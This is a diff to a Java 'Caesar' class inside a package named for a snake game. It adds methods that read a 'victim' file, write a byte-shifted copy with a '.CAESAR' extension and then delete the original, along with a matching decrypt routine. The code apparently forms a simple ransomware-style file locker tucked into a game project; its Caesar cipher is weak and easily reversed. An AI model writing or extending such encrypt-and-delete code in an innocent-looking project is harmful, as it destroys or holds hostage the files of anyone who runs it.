@@ -3,13 +3,15 @@ package me.herrlestrate.snakegame.crypto;
 import org.apache.commons.io.FilenameUtils;
 
 import java.io.*;
-import java.util.Scanner;
 
-public class Caesar {
+public class Caesar extends Crypto {
 
-    public final String CRYPT_NAME = "CAESAR";
+    Caesar(){
+        super("CAESAR");
+    }
 
-    public Caesar(File victim){
+    @Override
+    public void encryptFile(File victim) {
         if(!victim.exists()){
             System.err.println("Victim file not exists!");
             System.err.println("Victim: "+victim.getAbsolutePath());
@@ -21,8 +23,8 @@ public class Caesar {
             return;
         }
 
-        if(FilenameUtils.getExtension(victim.getName()).equalsIgnoreCase(CRYPT_NAME)){
-            System.err.println("Victim already crypted!");
+        if(FilenameUtils.getExtension(victim.getName()).equalsIgnoreCase(getCryptName())){
+            System.err.println("Victim already encrypted!");
             System.err.println(victim.getAbsolutePath());
             return;
         }
@@ -31,7 +33,7 @@ public class Caesar {
         FileOutputStream outputStream;
 
         String pathToTargetFile = victim.getAbsolutePath()
-                +"."+CRYPT_NAME;
+                +"."+getCryptName();
 
         File target = new File(pathToTargetFile);
         if(target.exists()){
@@ -40,15 +42,19 @@ public class Caesar {
         }
 
         try{
-            target.createNewFile();
+            if(!target.createNewFile()){
+                System.err.println("Cannot create "+target.getAbsolutePath());
+                return;
+            }
+
         }catch (IOException ex){
             ex.printStackTrace();
             return;
         }
 
         try{
-             inputStream = new FileInputStream(victim);
-             outputStream = new FileOutputStream(target);
+            inputStream = new FileInputStream(victim);
+            outputStream = new FileOutputStream(target);
         }catch (FileNotFoundException ex){
             ex.printStackTrace();
             return;
@@ -56,7 +62,7 @@ public class Caesar {
 
         try {
 
-            int sign = -1;
+            int sign;
             while ((sign = inputStream.read()) != -1) {
                 outputStream.write(cryptByte(sign,getStep()));
             }
@@ -64,34 +70,60 @@ public class Caesar {
             inputStream.close();
             outputStream.close();
 
+            if(!victim.delete()){
+                System.err.println("Cannot delete victim");
+                System.err.println(victim.getAbsolutePath());
+            }
+
         }catch (IOException ex){
             ex.printStackTrace();
         }
 
+
+    }
+
+    @Override
+    public void decryptFile(File victim, String[] args) {
+        if(victim.isDirectory()){
+            System.err.println("Victim is directory");
+            return;
+        }
+
+        if(!FilenameUtils.getExtension(victim.getName()).equalsIgnoreCase(getCryptName())){
+            System.err.println("Victim extension not right!");
+            System.err.println(victim.getAbsolutePath());
+            return;
+        }
+
+        FileInputStream inputStream;
+        FileOutputStream outputStream;
+
         String pathToDecodeFile =
                 FilenameUtils.getFullPath(victim.getAbsolutePath())
-                + "DECRTYPTED-"
-                + CRYPT_NAME
-                + victim.getName();
+                        + victim.getName().replace("."+getCryptName(),"");
 
         File decode = new File(pathToDecodeFile);
 
         try {
-            decode.createNewFile();
+            if(!decode.createNewFile()) {
+                System.err.println("Cannot create "+decode.getAbsolutePath());
+            }
+
         }catch (IOException ex){
             ex.printStackTrace();
         }
 
         try {
-            inputStream = new FileInputStream(target);
+            inputStream = new FileInputStream(victim);
             outputStream = new FileOutputStream(decode);
         }catch (FileNotFoundException ex){
             ex.printStackTrace();
+            return;
         }
 
         try {
 
-            int sign = -1;
+            int sign;
             while ((sign = inputStream.read()) != -1) {
                 outputStream.write(cryptByte(sign,-getStep()));
             }
@@ -99,15 +131,23 @@ public class Caesar {
             inputStream.close();
             outputStream.close();
 
+            if(!victim.delete()){
+                System.err.println("Cannot delete victim");
+                System.err.println(victim.getAbsolutePath());
+            }
+
         }catch (IOException ex){
             ex.printStackTrace();
         }
-
     }
 
     private int cryptByte(int x,int step){
         step %= 26;//default alphabet
         return (x+step+256)%256;
+    }
+
+    private int getStep(String key){
+        return Integer.parseInt(key);
     }
 
     private int getStep(){
